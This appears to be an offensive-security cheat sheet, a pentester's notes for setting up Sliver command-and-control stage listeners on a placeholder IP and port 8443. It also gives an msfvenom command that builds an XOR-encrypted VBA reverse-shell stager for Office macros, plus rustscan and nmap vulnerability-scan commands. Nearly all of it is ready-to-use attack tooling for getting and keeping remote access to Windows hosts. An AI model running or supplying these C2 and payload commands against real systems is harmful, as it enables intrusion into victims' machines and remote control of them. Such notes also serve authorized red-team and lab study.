## Sliver Setup
// for standard loader
profiles new --mtls 1.2.3.4 --format shellcode win-shellcode
stage-listener --url http://1.2.3.4:8443 --profile win-shellcode
mtls

// for meterpreter stager
profiles new --mtls 1.2.3.4 --format shellcode win-shellcode
stage-listener --url http://1.2.3.4:8443 --profile win-shellcode --prepend-size
mtls

// for vba
msfvenom --payload windows/x64/custom/reverse_winhttp LHOST=tun0 PORT=8443 LURI=/hello.woff EXITFUNC=thread --format vbapplication --encrypt xor --encrypt-key 'DEAD'


## Basic Enum
rustscan -a <tgt_ip> --ulimit 5000
ports=<ports>
nmap -Pn -p$port -A -T5 -oN scan.txt <tgt_ip>
sudo nmap -sV -p$ports--script "vuln"


